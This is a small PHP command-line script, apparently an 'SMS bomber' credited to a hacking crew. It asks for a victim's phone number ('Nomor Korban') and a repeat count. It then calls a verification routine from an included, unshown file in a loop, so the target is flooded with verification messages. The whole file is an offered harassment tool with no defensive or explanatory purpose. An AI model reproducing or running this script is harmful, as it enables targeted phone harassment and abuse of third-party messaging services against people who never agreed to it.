<?php
include 'bomhooq.php';
//BY ADITIA ALFIANSYAH
//https://github.com/Aditia18
//GARUDA TERSAKTI CREW
$init = new Bom();
//Eksekusi Sms Boomber
echo "Nomor Korban (Tanpa 62/0)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Santet\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}